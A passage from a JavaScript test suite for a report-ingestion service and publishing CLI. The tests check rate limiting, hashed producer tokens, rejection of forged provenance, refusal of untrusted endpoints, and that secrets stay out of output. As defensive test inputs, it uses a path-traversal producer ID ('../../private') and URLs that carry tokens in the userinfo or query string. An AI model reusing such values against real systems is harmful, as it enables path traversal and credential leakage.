  assert.equal(forbidden.status, 403);

  const approved = await submitIngestion(ingestion, nativeIngestionEnvelope({
    producer: "marketplace-laptop",
    project: "https://github.com/quickstark/marketplace.git",
    runId: "b142743b-2038-4f95-a156-0cd73c055533",
    outcome: "Publish only the explicitly granted marketplace report.",
  }), {
    token: "test-only-marketplace-producer-credential-4567890",
  });

  assert.equal(approved.status, 201);
  assert.equal((await approved.json()).project, "github.com/quickstark/marketplace");
  assert.match(await (await fetch(viewer.url)).text(), /Publish only the explicitly granted marketplace report/);
});

test("readout ingestion enforces a bounded per-producer submission rate", async (context) => {
  const { ingestion } = await temporaryReadoutIngestion(context, {
    ingestion: { maxRequestsPerMinute: 2 },
  });
  const runs = [
    "ef26ecf9-1d2f-426b-a04f-605a83d40ac1",
    "ef26ecf9-1d2f-426b-a04f-605a83d40ac2",
    "ef26ecf9-1d2f-426b-a04f-605a83d40ac3",
  ];

  const responses = [];

  for (const runId of runs) {
    responses.push(await submitIngestion(ingestion, nativeIngestionEnvelope({ runId })));
  }

  assert.deepEqual(responses.map((response) => response.status), [201, 201, 429]);
  assert.deepEqual(await responses[2].json(), { error: "rate_limited" });
  assert.ok(Number(responses[2].headers.get("retry-after")) > 0);
});

test("readout ingestion bounds result arrays and never accepts a catalog preview", async (context) => {
  const { ingestion } = await temporaryReadoutIngestion(context);
  const excessive = await submitIngestion(ingestion, nativeIngestionEnvelope({
    findings: Array.from({ length: 101 }, (_, index) => ({ title: `Observation ${index}` })),
  }));

  assert.equal(excessive.status, 422);

  const preview = await submitIngestion(ingestion, nativeIngestionEnvelope({
    status: "Preview",
    runId: "ef26ecf9-1d2f-426b-a04f-605a83d40ad1",
    findings: [],
  }));

  assert.equal(preview.status, 422);
});

test("external producer claims cannot create fabricated verified release evidence", async (context) => {
  const { ingestion } = await temporaryReadoutIngestion(context);
  const response = await submitIngestion(ingestion, nativeIngestionEnvelope({
    collection: "independent/engineering-skills",
    skill: "review-release",
    runId: "ef26ecf9-1d2f-426b-a04f-605a83d40ad2",
    provenance: verifiedGithubProvenance(),
  }));

  assert.equal(response.status, 422);
  assert.deepEqual(await response.json(), { error: "unverified_provenance" });
});

test("an authenticated native producer cannot fabricate independently verified delivery provenance", async (context) => {
  const { ingestion, viewer } = await temporaryReadoutIngestion(context);
  const response = await submitIngestion(ingestion, nativeIngestionEnvelope({
    provenance: verifiedGithubProvenance(),
  }));

  assert.equal(response.status, 422);
  assert.deepEqual(await response.json(), { error: "unverified_provenance" });
  assert.doesNotMatch(await (await fetch(viewer.url)).text(), /Publish verified skill readouts/);
});

test("ingestion loads hashed producer grants without storing bearer credentials", async (context) => {
  const directory = await temporaryReadoutDirectory(context);
  const configPath = join(directory, "producer-grants.json");
  const credential = "test-only-file-configured-producer-secret-1234567890";

  await writeFile(configPath, JSON.stringify({
    version: 1,
    producers: [{
      id: "codex-laptop",
      tokenSha256: createHash("sha256").update(credential).digest("hex"),
      projects: ["github.com/quickstark/skills"],
    }],
  }), { encoding: "utf8", mode: 0o600 });

  const viewer = await startReadoutServer({
    directory,
    port: 0,
    publicationMode: "hosted",
    allowedProjects: ["github.com/quickstark/skills"],
  });

  context.after(async () => {
    if (!viewer.server.listening) return;
    await new Promise((done, fail) => viewer.server.close((error) => error ? fail(error) : done()));
  });

  const ingestion = await startReadoutIngestionServer({
    directory,
    port: 0,
    baseUrl: viewer.url,
    allowedProjects: ["github.com/quickstark/skills"],
    producersFile: configPath,
  });

  context.after(async () => {
    if (!ingestion.server.listening) return;
    await new Promise((done, fail) => ingestion.server.close((error) => error ? fail(error) : done()));
  });

  const accepted = await submitIngestion(ingestion, nativeIngestionEnvelope(), { token: credential });
  assert.equal(accepted.status, 201);
  assert.doesNotMatch(await readFile(configPath, "utf8"), new RegExp(credential));
  assert.doesNotMatch(await (await fetch((await accepted.json()).url)).text(), new RegExp(credential));
});

test("the producer-token utility safely creates distinct per-machine credentials without exposing or replacing existing tokens", async (context) => {
  const directory = await temporaryReadoutDirectory(context);
  const credentialsDirectory = await temporaryReadoutDirectory(context);
  const producersFile = join(directory, "readout-producers.json");
  const personalToken = "test-only-existing-personal-laptop-token-1234567890";
  const personalPath = join(credentialsDirectory, "personal-codex-laptop.token");
  const generator = join(repositoryRoot, "scripts", "qs-readout-producer-token.mjs");

  await writeFile(personalPath, `${personalToken}\n`, {
    encoding: "utf8",
    flag: "wx",
    mode: 0o600,
  });
  await writeFile(producersFile, JSON.stringify({
    version: 1,
    producers: [{
      id: "personal-codex-laptop",
      tokenSha256: createHash("sha256").update(personalToken).digest("hex"),
      projects: ["*"],
    }],
  }, null, 2), { encoding: "utf8", mode: 0o600 });

  const issued = [];

  for (const id of ["openai-codex-laptop", "linux-codex-dev-server"]) {
    const { stdout, stderr } = await execFileAsync(process.execPath, [
      generator,
      "--producer", id,
      "--credentials-directory", credentialsDirectory,
      "--producers-file", producersFile,
      "--json",
    ]);
    const result = JSON.parse(stdout);
    const path = join(credentialsDirectory, `${id}.token`);
    const token = (await readFile(path, "utf8")).trim();

    assert.equal(result.producer, id);
    assert.equal(result.credentialPath, path);
    assert.deepEqual(result.authorizedProjects, ["*"]);
    assert.match(token, /^[A-Za-z0-9_-]{64}$/);
    assert.equal((await stat(path)).mode & 0o777, 0o600);
    assert.doesNotMatch(stdout, new RegExp(token));
    assert.doesNotMatch(stderr, new RegExp(token));

    issued.push({ id, token });
  }

  assert.notEqual(issued[0].token, issued[1].token);
  assert.equal(await readFile(personalPath, "utf8"), `${personalToken}\n`);

  const grants = JSON.parse(await readFile(producersFile, "utf8"));

  assert.equal(grants.version, 1);
  assert.deepEqual(grants.producers.map(({ id }) => id), [
    "personal-codex-laptop",
    "openai-codex-laptop",
    "linux-codex-dev-server",
  ]);
  assert.equal((await stat(producersFile)).mode & 0o777, 0o600);

  for (const { id, token } of issued) {
    const grant = grants.producers.find((producer) => producer.id === id);

    assert.equal(grant.tokenSha256, createHash("sha256").update(token).digest("hex"));
    assert.deepEqual(grant.projects, ["*"]);
    assert.doesNotMatch(await readFile(producersFile, "utf8"), new RegExp(token));
  }
});

test("the producer-token utility refuses unsafe or duplicate producer identities without changing credentials", async (context) => {
  const directory = await temporaryReadoutDirectory(context);
  const credentialsDirectory = await temporaryReadoutDirectory(context);
  const producersFile = join(directory, "readout-producers.json");
  const generator = join(repositoryRoot, "scripts", "qs-readout-producer-token.mjs");
  const grants = JSON.stringify({
    version: 1,
    producers: [{
      id: "personal-codex-laptop",
      tokenSha256: createHash("sha256").update("test-only-existing-personal-laptop-token-1234567890").digest("hex"),
      projects: ["*"],
    }],
  }, null, 2);

  await writeFile(producersFile, grants, { encoding: "utf8", mode: 0o600 });

  for (const id of ["../../private", "openai laptop", "personal-codex-laptop"]) {
    await assert.rejects(execFileAsync(process.execPath, [
      generator,
      "--producer", id,
      "--credentials-directory", credentialsDirectory,
      "--producers-file", producersFile,
      "--json",
    ]), /safe producer identifier|already registered/i);
  }

  assert.equal(await readFile(producersFile, "utf8"), grants);
  assert.deepEqual(await readdir(credentialsDirectory), []);
});

test("the producer-token utility documents safe per-machine credential creation without exposing secrets", async () => {
  const generator = join(repositoryRoot, "scripts", "qs-readout-producer-token.mjs");
  const { stdout, stderr } = await execFileAsync(process.execPath, [generator, "--help"]);

  assert.match(stdout, /--producer <(?:safe-machine-id|id)>/);
  assert.match(stdout, /SHA-256 digest/);
  assert.match(stdout, /never prints the token/i);
  assert.equal(stderr, "");
});

test("the portable publisher refuses untrusted remote or malformed ingestion endpoints", async () => {
  for (const endpoint of [
    "http://reports.quickstark.com/api/v1/readouts",
    "https://reports.quickstark.com/api/v1/readouts/extra",
    "https://token@reports.quickstark.com/api/v1/readouts",
    "https://reports.quickstark.com/api/v1/readouts?token=secret",
  ]) {
    await assert.rejects(publishSkillReadout(nativeIngestionEnvelope(), {
      endpoint,
      token: "test-only-codex-laptop-credential-1234567890",
      allowedProjects: ["github.com/quickstark/skills"],
    }), /trusted HTTPS producer route/i);
  }
});

test("the readout command documents portable publishing and isolated ingestion", async () => {
  const script = join(repositoryRoot, "scripts", "qs-skill-readout.mjs");
  const { stdout } = await execFileAsync(process.execPath, [script, "--help"]);

  assert.match(stdout, /\bingest\b/);
  assert.match(stdout, /\bpublish\b/);
  assert.match(stdout, /QS_READOUT_INGESTION_URL/);
  assert.match(stdout, /QS_READOUT_PRODUCERS_FILE/);
  assert.match(stdout, /QS_READOUT_PUBLISH_PROJECTS/);
  assert.match(stdout, /--max-attempts/);
  assert.match(stdout, /--retry-delay/);
  assert.match(stdout, /--report-base-url/);
  assert.match(stdout, /QS_READOUT_PUBLISH_MAX_ATTEMPTS/);
  assert.match(stdout, /QS_READOUT_PUBLISH_RETRY_DELAY/);
});

test("any harness can publish a structured readout through the portable command", async (context) => {
  const { ingestion } = await temporaryReadoutIngestion(context);
  const script = join(repositoryRoot, "scripts", "qs-skill-readout.mjs");
  const secret = "test-only-codex-laptop-credential-1234567890";
  const { stdout, stderr } = await execFileAsync(process.execPath, [
    script,
    "publish",
    "--data", JSON.stringify(nativeIngestionEnvelope()),
    "--endpoint", new URL("api/v1/readouts", ingestion.url).href,
    "--allowed-projects", "github.com/quickstark/skills",
    "--json",
  ], {
    env: { ...process.env, QS_READOUT_PRODUCER_TOKEN: secret },
  });

  const result = JSON.parse(stdout);
  assert.equal(result.status, "published");
  assert.equal(result.created, true);
  assert.equal((await fetch(result.url)).status, 200);
  assert.doesNotMatch(stdout, new RegExp(secret));
  assert.doesNotMatch(stderr, new RegExp(secret));
});

test("owner-scoped reporting discovers and publishes the actual Git repository without per-project configuration", async (context) => {
  const scopes = ["github.com/quickstark/*", "github.com/quickstarkdemo/*"];
  const { ingestion, viewer } = await temporaryReadoutIngestion(context, {
    viewer: { allowedProjects: scopes },
    ingestion: {
      allowedProjects: scopes,
      producers: [{
        id: "codex-laptop",
        token: "test-only-codex-laptop-credential-1234567890",
        projects: scopes,
      }],
    },
  });
  const localDirectory = await temporaryReadoutDirectory(context);
  const script = join(repositoryRoot, "scripts", "qs-skill-readout.mjs");
  const environment = {
    ...process.env,
    QS_READOUT_BASE_URL: "http://127.0.0.1:1/",
    QS_READOUT_INGESTION_URL: new URL("api/v1/readouts", ingestion.url).href,
    QS_READOUT_PRODUCER_ID: "codex-laptop",
    QS_READOUT_PRODUCER_TOKEN: "test-only-codex-laptop-credential-1234567890",
    QS_READOUT_PUBLISH_PROJECTS: scopes.join(","),
    QS_READOUT_PUBLISH_RETRY_DELAY: "0",
  };
  const repositories = [
    ["https://github.com/quickstark/skills.git", "github.com/quickstark/skills"],
    ["git@github.com:quickstark/marketplace.git", "github.com/quickstark/marketplace"],
    ["https://github.com/quickstarkdemo/blossy-app.git", "github.com/quickstarkdemo/blossy-app"],
  ];

  for (const [remote, expectedProject] of repositories) {
    const cwd = await temporaryGitProject(context, remote);
    const { stdout } = await execFileAsync(process.execPath, [
      script,
      "render",
      "--data", JSON.stringify({
        skill: "qs-code-build",
        outcome: `Publish only the verified current ${expectedProject} repository.`,
      }),
      "--directory", localDirectory,
      "--json",
    ], { cwd, env: environment });
    const result = JSON.parse(stdout);

    assert.equal(result.projectIdentity.key, expectedProject);
    assert.equal(result.projectIdentity.source, "git-origin");
    assert.equal(result.publication.status, "published");
    assert.equal(result.publication.project, expectedProject);
    assert.equal(result.url, result.publication.url);
    assert.ok(result.publication.url.startsWith(viewer.url));
    assert.equal(await exists(result.path), true);

    const response = await fetch(result.publication.url);

    assert.equal(response.status, 200);
    const hosted = await response.text();

    assert.match(hosted, new RegExp(`content="${expectedProject.replaceAll("/", "\\/")}"`));
    assert.match(hosted, /<meta name="quickstark:harness" content="codex">/);
  }

  const index = await (await fetch(viewer.url)).text();

  assert.match(index, /quickstark\/skills/);
  assert.match(index, /quickstark\/marketplace/);
  assert.match(index, /quickstarkdemo\/blossy-app/);
});

test("hosted-only skill rendering never substitutes a filesystem path or private-IP viewer for a missing producer token", async (context) => {
  const home = await temporaryReadoutDirectory(context);
  const directory = await temporaryReadoutDirectory(context);
  const environment = { ...process.env };

  delete environment.QS_READOUT_PRODUCER_TOKEN;
  delete environment.QS_READOUT_PRODUCER_ID;
  delete environment.QS_READOUT_HARNESS;
  delete environment.QS_READOUT_BASE_URL;
  delete environment.QS_READOUT_ACCESS;

  Object.assign(environment, {
    HOME: home,
    CODEX_HOME: join(home, ".codex"),
  });

  await assert.rejects(
    execFileAsync(process.execPath, [
      join(repositoryRoot, "scripts", "qs-skill-readout.mjs"),
      "render",
      "--require-hosted",
      "--data", JSON.stringify({
        skill: "qs-design-architecture",
        status: "Awaiting input",
        outcome: "Present the architecture review only on the authenticated reports domain.",
        nextSkills: [],
      }),
      "--directory", directory,
      "--json",
    ], { env: environment }),
    (error) => {
      assert.match(error.stderr, /hosted.*producer|producer.*hosted|reports\.quickstark\.com/i);
      assert.doesNotMatch(error.stderr, /http:\/\/(?:localhost|127\.0\.0\.1|192\.168\.)/i);
      return true;
    },
    "an actual promoted skill must fail clearly without publishing credentials instead of returning a local path or private-IP viewer",
  );

  const reports = (await readdir(directory)).filter((entry) => entry.endsWith(".html"));

  assert.equal(reports.length, 1,
    "a hosted-publication failure must still preserve the immutable local recovery artifact");
});

test("hosted-only architecture rendering returns only the accepted reports-service URL", async (context) => {
  const credential = "test-only-hosted-architecture-credential-1234567890";
  const { ingestion, viewer } = await temporaryReadoutIngestion(context, {
    viewer: { allowedProjects: ["*"] },
    ingestion: {
      baseUrl: "https://reports.quickstark.com/",
      allowedProjects: ["*"],
      producers: [{ id: "architecture-codex", token: credential, projects: ["*"] }],
    },
  });
  const directory = await temporaryReadoutDirectory(context);
  const environment = {
    ...process.env,
    QS_READOUT_PRODUCER_TOKEN: credential,
    QS_READOUT_INGESTION_URL: "https://other.invalid/api/v1/readouts",
    QS_READOUT_BASE_URL: "http://127.0.0.1:1/",
    QS_READOUT_PUBLISH_RETRY_DELAY: "0",
  };

  const { stdout, stderr } = await execFileAsync(process.execPath, [
    "--import", redirectCanonicalHostedIngestion(ingestion),
    join(repositoryRoot, "scripts", "qs-skill-readout.mjs"),
    "render",
    "--require-hosted",
    "--endpoint", "https://reports.quickstark.com/api/v1/readouts",
    "--data", JSON.stringify({
      skill: "qs-design-architecture",
      status: "Awaiting input",
      outcome: "Present the architecture opportunities through the authenticated reporting domain.",
      nextSkills: [],
    }),
    "--directory", directory,
    "--json",
  ], { env: environment });
  const result = JSON.parse(stdout);

  assert.equal(result.publication?.status, "published");
  assert.equal(result.url, result.publication.url);
  assert.equal(new URL(result.url).origin, "https://reports.quickstark.com");
  assert.equal(result.viewerReused, null,
    "hosted-only architecture rendering must never start a local or private-network viewer");
  assert.doesNotMatch(stdout, /other\.invalid/i,
    "an untrusted environment endpoint must never override the explicitly validated canonical domain");
  assert.doesNotMatch(stdout, new RegExp(credential));
  assert.doesNotMatch(stderr, new RegExp(credential));
  const storedReport = new URL(new URL(result.url).pathname, viewer.url);

  assert.equal((await fetch(storedReport)).status, 200);
});

test("hosted-only skill rendering fails closed when authenticated publication is rejected", async (context) => {
  const { ingestion } = await temporaryReadoutIngestion(context, {
    viewer: { allowedProjects: ["*"] },
    ingestion: {
      baseUrl: "https://reports.quickstark.com/",
      allowedProjects: ["*"],
      producers: [{
        id: "authorized-codex",
        token: "test-only-authorized-producer-credential-1234567890",
        projects: ["*"],
      }],
    },
  });
  const directory = await temporaryReadoutDirectory(context);
  const rejectedToken = "test-only-rejected-producer-credential-1234567890";
  const environment = {
    ...process.env,
    QS_READOUT_PRODUCER_TOKEN: rejectedToken,
    QS_READOUT_PUBLISH_RETRY_DELAY: "0",
  };

  await assert.rejects(
    execFileAsync(process.execPath, [
      "--import", redirectCanonicalHostedIngestion(ingestion),
      join(repositoryRoot, "scripts", "qs-skill-readout.mjs"),
      "render",
      "--require-hosted",
      "--data", JSON.stringify({
        skill: "qs-design-architecture",
        outcome: "Never replace denied hosted architecture reporting with a private-IP viewer.",
        nextSkills: [],
      }),
      "--directory", directory,
      "--json",
    ], { env: environment }),
    (error) => {
      assert.match(error.stderr, /hosted.*failed|publication_not_authorized|reports\.quickstark\.com/i);
      assert.doesNotMatch(error.stderr, new RegExp(rejectedToken));
      assert.doesNotMatch(error.stderr, /http:\/\/(?:localhost|127\.0\.0\.1|192\.168\.)/i);
      return true;
    },
  );

  assert.equal((await readdir(directory)).filter((entry) => entry.endsWith(".html")).length, 1,
    "a rejected hosted submission must preserve its immutable local recovery artifact");
});

test("hosted-only reporting rejects noncanonical endpoints before sending a producer credential", async (context) => {
  let credentialRequests = 0;
  const { ingestion } = await temporaryReadoutIngestion(context, {
    viewer: { allowedProjects: ["*"] },
    ingestion: {
      allowedProjects: ["*"],
      producers: [{
        id: "local-imposter",
        token: "test-only-hosted-domain-bound-producer-credential-1234567890",
        projects: ["*"],
      }],
      audit() {
        credentialRequests += 1;
      },
    },
  });
  const directory = await temporaryReadoutDirectory(context);
  const credential = "test-only-hosted-domain-bound-producer-credential-1234567890";
  const environment = {
    ...process.env,
    QS_READOUT_PRODUCER_TOKEN: credential,
    QS_READOUT_INGESTION_URL: new URL("api/v1/readouts", ingestion.url).href,
  };

  await assert.rejects(
    execFileAsync(process.execPath, [
      join(repositoryRoot, "scripts", "qs-skill-readout.mjs"),
      "render",
      "--require-hosted",
      "--data", JSON.stringify({
        skill: "qs-design-architecture",
        outcome: "Never send a hosted-only producer credential to another server.",
        nextSkills: [],
      }),
      "--directory", directory,
      "--json",
    ], { env: environment }),
    (error) => {
      assert.match(error.stderr, /canonical|reports\.quickstark\.com|trusted.*domain/i);
      assert.doesNotMatch(error.stderr, new RegExp(credential));
      return true;
    },
  );

  assert.equal(credentialRequests, 0,
    "the producer credential must never be sent to an override, loopback, or imposter endpoint");
  assert.equal((await readdir(directory)).filter((entry) => entry.endsWith(".html")).length, 1,
    "the blocked canonical-domain mismatch must preserve its private immutable report");
});

test("invalid hosted-only producer credentials preserve a private immutable recovery report", async (context) => {
  const home = await temporaryReadoutDirectory(context);
  const directory = await temporaryReadoutDirectory(context);
  const environment = {
    ...process.env,
    HOME: home,
    CODEX_HOME: join(home, ".codex"),
    QS_READOUT_PRODUCER_TOKEN: "invalid",
  };

  await assert.rejects(
    execFileAsync(process.execPath, [
      join(repositoryRoot, "scripts", "qs-skill-readout.mjs"),
      "render",
      "--require-hosted",
      "--data", JSON.stringify({
        skill: "qs-design-architecture",
        outcome: "Preserve the immutable report when private producer validation fails.",
        nextSkills: [],
      }),
      "--directory", directory,
      "--json",
    ], { env: environment }),
    (error) => {
      assert.match(error.stderr, /safe|invalid|producer|credential/i);
      assert.doesNotMatch(error.stderr, /invalid\s*$/i);
      return true;
    },
  );

  assert.equal((await readdir(directory)).filter((entry) => entry.endsWith(".html")).length, 1,
    "unsafe producer configuration must not prevent recovery-report creation");
});

test("hosted-only mode never applies to standalone visuals, galleries, or portable publishing", async () => {
  for (const command of ["visual", "gallery", "publish"]) {
    await assert.rejects(
      execFileAsync(process.execPath, [
        join(repositoryRoot, "scripts", "qs-skill-readout.mjs"),
        command,
        "--require-hosted",
        "--json",
      ]),
      (error) => {
        assert.match(error.stderr, /require-hosted.*render|render.*require-hosted/i,
          `${command} must reject a flag whose hosted-only guarantees it cannot enforce`);
        return true;
      },
    );
  }
});

test("a single reporting token automatically identifies the producer, harness, and any actual project", async (context) => {
  const { ingestion, viewer } = await temporaryReadoutIngestion(context, {
    viewer: { allowedProjects: ["*"] },
    ingestion: {
      allowedProjects: ["*"],
      producers: [{
        id: "codex-laptop",
        token: "test-only-codex-laptop-credential-1234567890",
        projects: ["*"],
      }],
    },
  });
  const localDirectory = await temporaryReadoutDirectory(context);
  const script = join(repositoryRoot, "scripts", "qs-skill-readout.mjs");
  const environment = { ...process.env };

  delete environment.QS_READOUT_PUBLISH_PROJECTS;
  delete environment.QS_READOUT_PRODUCER_ID;
  delete environment.QS_READOUT_HARNESS;

  Object.assign(environment, {
    QS_READOUT_BASE_URL: "http://127.0.0.1:1/",
    QS_READOUT_INGESTION_URL: new URL("api/v1/readouts", ingestion.url).href,
    QS_READOUT_PRODUCER_TOKEN: "test-only-codex-laptop-credential-1234567890",
    QS_READOUT_PUBLISH_RETRY_DELAY: "0",
  });

  for (const [remote, expectedProject] of [
    ["https://github.com/quickstark/skills.git", "github.com/quickstark/skills"],
    ["git@github.com:quickstark/marketplace.git", "github.com/quickstark/marketplace"],
    ["https://github.com/quickstarkdemo/blossy-app.git", "github.com/quickstarkdemo/blossy-app"],
    ["https://gitlab.com/independent-team/private-tool.git", "gitlab.com/independent-team/private-tool"],
  ]) {
    const cwd = await temporaryGitProject(context, remote);
    const { stdout, stderr } = await execFileAsync(process.execPath, [
      script,
      "render",
      "--data", JSON.stringify({
        skill: "qs-code-build",
        outcome: `Automatically report only the actual current ${expectedProject} project.`,
      }),
      "--directory", localDirectory,
      "--json",
    ], { cwd, env: environment });
    const result = JSON.parse(stdout);

    assert.equal(result.projectIdentity.key, expectedProject);
    assert.equal(result.projectIdentity.source, "git-origin");
    assert.equal(result.publication.status, "published");
    assert.equal(result.publication.project, expectedProject);
    assert.equal(result.viewerReused, null);
    assert.equal(result.url, result.publication.url);
    assert.ok(result.url.startsWith(viewer.url));
    assert.equal(await exists(result.path), true);
    assert.doesNotMatch(stdout, /test-only-codex-laptop-credential/);
    assert.doesNotMatch(stderr, /test-only-codex-laptop-credential/);

    const response = await fetch(result.url);
    const hosted = await response.text();

    assert.equal(response.status, 200);
    assert.match(hosted, new RegExp(`content="${expectedProject.replaceAll("/", "\\/")}"`));
    assert.match(hosted, /<meta name="quickstark:producer" content="codex-laptop">/);
    assert.match(hosted, /<meta name="quickstark:harness" content="codex">/);
  }

  const index = await (await fetch(viewer.url)).text();

  assert.match(index, /quickstark\/skills/);
  assert.match(index, /quickstark\/marketplace/);
  assert.match(index, /quickstarkdemo\/blossy-app/);
  assert.match(index, /independent-team\/private-tool/);
});

test("a securely installed Linux token publishes remote Sterling Hollis readouts to the reports service instead of a private-IP viewer", async (context) => {
  const credential = "test-only-standard-file-machine-credential-1234567890";
  const { ingestion, viewer } = await temporaryReadoutIngestion(context, {
    viewer: { allowedProjects: ["*"] },
    ingestion: {
      allowedProjects: ["*"],
      producers: [{
        id: "linux-codex-dev-server",
        token: credential,
        projects: ["*"],
      }],
    },
  });
  const home = await temporaryReadoutDirectory(context);
  const privateDirectory = join(home, ".config", "quickstark");
  const credentialPath = join(privateDirectory, "producer.token");
  await mkdir(privateDirectory, { recursive: true, mode: 0o700 });
  await writeFile(credentialPath, `${credential}\n`, { encoding: "utf8", mode: 0o600 });

  const cwd = await temporaryGitProject(
    context,
    "https://github.com/quickstarkdemo/sterling-hollis-be.git",
  );
  const localDirectory = await temporaryReadoutDirectory(context);
  const environment = { ...process.env };

  delete environment.QS_READOUT_PRODUCER_TOKEN;
  delete environment.QS_READOUT_PRODUCER_ID;
  delete environment.QS_READOUT_PUBLISH_PROJECTS;
  delete environment.QS_READOUT_HARNESS;
  delete environment.CODEX_HOME;

  Object.assign(environment, {
    HOME: home,
    QS_READOUT_BASE_URL: "http://127.0.0.1:1/",
    QS_READOUT_INGESTION_URL: new URL("api/v1/readouts", ingestion.url).href,
    QS_READOUT_PUBLISH_RETRY_DELAY: "0",
  });

  const { stdout, stderr } = await execFileAsync(process.execPath, [
    join(repositoryRoot, "scripts", "qs-skill-readout.mjs"),
    "render",
    "--data", JSON.stringify({
      skill: "qs-code-debug",
      outcome: "Publish the actual remote Sterling Hollis backend report to the configured reporting service.",
      nextSkills: [],
    }),
    "--directory", localDirectory,
    "--no-serve",
    "--json",
  ], { cwd, env: environment });

  const result = JSON.parse(stdout);

  assert.equal(result.projectIdentity.key, "github.com/quickstarkdemo/sterling-hollis-be");
  assert.equal(result.publication?.status, "published",
    "an already-installed owner-only Linux token must enable authenticated hosted publication");
  assert.equal(result.url, result.publication.url,
    "the actual skill result must link to the accepted hosted report, never a local IP viewer");
  assert.ok(result.url.startsWith(viewer.url));
  assert.equal(result.viewerReused, null,
    "hosted reporting must not start or depend on a private-network viewer");
  assert.doesNotMatch(stdout, new RegExp(credential),
    "the discovered private machine token must never appear in skill output");
  assert.doesNotMatch(stderr, new RegExp(credential),
    "the discovered private machine token must never appear in diagnostics");

  const response = await fetch(result.url);
  assert.equal(response.status, 200);
  assert.match(await response.text(),
    /<meta name="quickstark:project" content="github\.com\/quickstarkdemo\/sterling-hollis-be">/,
    "the accepted report must preserve the actual remote backend repository identity");
});

test("separate default and demo Codex profiles publish Sterling Hollis reports using their own private producer tokens", async (context) => {
  const profiles = [
    {
      directory: ".codex",
      producer: "primary-macos-codex",
      token: "test-only-primary-profile-machine-credential-1234567890",
    },
    {
      directory: ".codex-demo",
      producer: "demo-macos-codex",
      token: "test-only-demo-profile-machine-credential-1234567890",
    },
  ];
  const { ingestion, viewer } = await temporaryReadoutIngestion(context, {
    viewer: { allowedProjects: ["*"] },
    ingestion: {
      allowedProjects: ["*"],
      producers: profiles.map((profile) => ({
        id: profile.producer,
        token: profile.token,
        projects: ["*"],
      })),
    },
  });
  const home = await temporaryReadoutDirectory(context);
  const cwd = await temporaryGitProject(
    context,
    "https://github.com/quickstarkdemo/sterling-hollis-be.git",
  );
  const localDirectory = await temporaryReadoutDirectory(context);

  for (const profile of profiles) {
    const profileDirectory = join(home, profile.directory);
    const credentialDirectory = join(profileDirectory, "quickstark");
    await mkdir(credentialDirectory, { recursive: true, mode: 0o700 });
    await writeFile(join(credentialDirectory, "producer.token"), `${profile.token}\n`, {
      encoding: "utf8",
      mode: 0o600,
    });

    const environment = { ...process.env };
    delete environment.QS_READOUT_PRODUCER_TOKEN;
    delete environment.QS_READOUT_PRODUCER_ID;
    delete environment.QS_READOUT_PUBLISH_PROJECTS;
    delete environment.QS_READOUT_HARNESS;
    Object.assign(environment, {
      HOME: home,
      CODEX_HOME: profileDirectory,
      QS_READOUT_BASE_URL: "http://127.0.0.1:1/",
      QS_READOUT_INGESTION_URL: new URL("api/v1/readouts", ingestion.url).href,
      QS_READOUT_PUBLISH_RETRY_DELAY: "0",
    });

    const { stdout, stderr } = await execFileAsync(process.execPath, [
      join(repositoryRoot, "scripts", "qs-skill-readout.mjs"),
      "render",
      "--data", JSON.stringify({
        skill: "qs-code-debug",
        outcome: `Publish the Sterling Hollis report from the ${profile.directory} Codex profile.`,
        nextSkills: [],
      }),
      "--directory", localDirectory,
      "--no-serve",
      "--json",
    ], { cwd, env: environment });

    const result = JSON.parse(stdout);
    assert.equal(result.projectIdentity.key, "github.com/quickstarkdemo/sterling-hollis-be");
    assert.equal(result.publication?.status, "published",
      `${profile.directory} must automatically publish using its own installed credential`);
    assert.equal(result.url, result.publication.url,
      `${profile.directory} must return the reports-service URL, not a private viewer`);
    assert.ok(result.url.startsWith(viewer.url));
    assert.equal(result.viewerReused, null);

    const response = await fetch(result.url);
    assert.equal(response.status, 200);
    const html = await response.text();
    assert.ok(html.includes(`<meta name="quickstark:producer" content="${profile.producer}">`),
      `${profile.directory} must remain independently identifiable and revocable`);

    for (const candidate of profiles) {
      assert.doesNotMatch(stdout, new RegExp(candidate.token));
      assert.doesNotMatch(stderr, new RegExp(candidate.token));
      assert.ok(!html.includes(candidate.token),
        "neither profile's private credential may enter its immutable hosted readout");
    }
  }
});

test("macOS profile credentials remain independent even when both Codex applications inherit a shared desktop token", async (context) => {
  const home = await temporaryReadoutDirectory(context);
  const sharedToken = "test-only-shared-macos-desktop-credential-1234567890";
  const profiles = [
    { directory: ".codex", token: "test-only-primary-macos-profile-credential-1234567890" },
    { directory: ".codex-demo", token: "test-only-demo-macos-profile-credential-1234567890" },
  ];

  for (const profile of profiles) {
    const profileHome = join(home, profile.directory);
    const credentialDirectory = join(profileHome, "quickstark");

    await mkdir(credentialDirectory, { recursive: true, mode: 0o700 });
    await writeFile(join(credentialDirectory, "producer.token"), `${profile.token}\n`, {
      encoding: "utf8",
      mode: 0o600,
    });

    assert.equal(
      await resolveReadoutProducerToken({
        environment: {
          CODEX_HOME: profileHome,
          QS_READOUT_PRODUCER_TOKEN: sharedToken,
        },
        home,
        operatingSystem: "darwin",
      }),
      profile.token,
      `${profile.directory} must prefer its own private token over a shared macOS desktop environment`,
    );
  }

  const unconfiguredHome = await temporaryReadoutDirectory(context);

  assert.equal(
    await resolveReadoutProducerToken({
      environment: { QS_READOUT_PRODUCER_TOKEN: sharedToken },
      home: unconfiguredHome,
      operatingSystem: "darwin",
    }),
    sharedToken,
    "an explicitly configured macOS token remains supported when no active profile credential exists",
  );

  assert.equal(
    await resolveReadoutProducerToken({
      environment: {
        CODEX_HOME: join(home, ".codex-demo"),
        QS_READOUT_PRODUCER_TOKEN: sharedToken,
      },
      home,
      operatingSystem: "linux",
    }),
    sharedToken,
    "existing explicit Linux producer-token precedence remains backward compatible",
  );
});

test("the active macOS profile Keychain credential takes precedence over a shared desktop producer token", async (context) => {
  const home = await temporaryReadoutDirectory(context);
  const bin = join(home, "mock-bin");
  const profile = join(home, ".codex-demo");
  const profileToken = "test-only-macos-demo-keychain-credential-1234567890";
  const sharedToken = "test-only-shared-macos-desktop-credential-1234567890";

  await mkdir(bin, { recursive: true, mode: 0o700 });
  await mkdir(profile, { recursive: true, mode: 0o700 });
  await writeFile(join(bin, "security"), [
    "#!/bin/sh",
    'case "$*" in',
    '  *quickstark-readout-producer-token-.codex-demo*)',
    '    printf "%s\\n" "$QUICKSTARK_TEST_PROFILE_KEYCHAIN_TOKEN" ;;',
    "  *) exit 44 ;;",
    "esac",
    "",
  ].join("\n"), { encoding: "utf8", mode: 0o755 });

  const module = new URL("../scripts/qs-skill-readout.mjs", import.meta.url).href;
  const evaluate = [
